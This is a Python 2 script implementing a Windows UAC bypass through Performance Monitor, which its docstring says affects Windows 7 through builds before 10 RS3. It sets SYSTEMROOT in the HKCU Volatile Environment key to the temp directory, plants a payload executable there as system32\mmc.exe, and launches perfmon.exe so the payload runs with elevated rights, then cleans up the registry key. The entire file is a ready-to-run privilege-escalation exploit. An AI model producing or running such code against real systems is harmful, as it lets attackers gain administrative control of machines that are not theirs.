"""
Works from: Windows 7
Fixed in: Windows 10 RS3 (16299)
https://bytecode77.com/hacking/exploits/uac-bypass/performance-monitor-privilege-escalation
"""
import os
import time
import shutil
import _winreg
import tempfile
from colorama import init, Fore
init(convert=True)

payload = "example_payloads\\MessageBox.exe"

def successBox():
	return (Fore.GREEN + '[+]' + Fore.RESET)
	
def errorBox():
	return (Fore.RED + '[-]' + Fore.RESET)

def infoBox():
	return (Fore.CYAN + '[!]' + Fore.RESET)	
	
def warningBox():
	return (Fore.YELLOW + '[!]' + Fore.RESET)

def perfmon():
	print " {} perfmon: Attempting to change %SYTEMROOT% through volatile environment".format(infoBox())
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
								os.path.join("Volatile Environment"))
								
		_winreg.SetValueEx(key,
							"SYSTEMROOT",
							0,
							_winreg.REG_SZ,
							tempfile.gettempdir())
		_winreg.CloseKey(key)
		print " {} perfmon: Registry %SYTEMROOT% key was created".format(successBox())
	except Exception as error:
		print " {} perfmon: Unable to create %SYTEMROOT% key - {}".format(errorBox(),error)
		return False

	try:
		if ((os.path.exists(os.path.join(tempfile.gettempdir(),"system32"))) == True):
			if ((os.path.isfile(os.path.join(tempfile.gettempdir(),"system32\mmc.exe"))) == True):
				try:
					os.remove(os.path.join(tempfile.gettempdir(),"system32\mmc.exe"))
				except Exception as error:
					return False
				try:
					os.rmdir(os.path.join(tempfile.gettempdir(),"system32"))
				except Exception as error:
					return False
			else:
				try:
					os.rmdir(os.path.join(tempfile.gettempdir(),"system32"))
				except Exception as error:
					return False
		else:
			pass
	except Exception as error:
		return False

	try:
		os.makedirs(os.path.join(tempfile.gettempdir(),"system32"))
		print " {} perfmon: Successfully created temp directory".format(successBox())
	except Exception as error:
		print " {} perfmon: Unable to create folder - {}".format(errorBox(),error)
		return False
		
	print " {} perfmon: Pausing for 5 seconds before copy".format(infoBox())	
	time.sleep(5)

	try:
		shutil.copy(payload,os.path.join(tempfile.gettempdir(),"system32\mmc.exe"))
		print " {} perfmon: Successfully copied: {} to: {}".format(successBox(),payload,os.path.join(tempfile.gettempdir(),"system32\mmc.exe"))
	except shutil.Error as error:
		print " {} perfmon: Unable to copy: {}".format(errorBox(),payload)
		return False
	except IOError as error:
		print " {} perfmon: Unable to copy: {}".format(errorBox(),payload)
		return False

	print " {} perfmon: Pausing for 5 seconds before executing".format(infoBox())	
	time.sleep(5)

	try:
		print " {} perfmon: Attempting to create process".format(infoBox())
		if (os.system("perfmon.exe") == 0):
			print " {} perfmon: Process started successfully".format(successBox())
		else:
			print " {} perfmon: Problem creating process".format(errorBox())
			return False
	except Exception as error:		
		print " {} perfmon: Problem creating process".format(errorBox())
		return False
	
	print " {} perfmon: Pausing for 5 seconds before cleaning".format(infoBox())	
	time.sleep(5)

	print " {} perfmon: Attempting to remove %SYTEMROOT% registry key".format(infoBox())
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
								os.path.join("Volatile Environment"))
		_winreg.DeleteValue(key,
							"SYSTEMROOT")
		print " {} perfmon: %SYTEMROOT% registry key was deleted".format(successBox())
	except Exception as error:
		print " {} perfmon: Unable to delete %SYTEMROOT% registry key: {}".format(errorBox(),error)
		return False
		
perfmon()		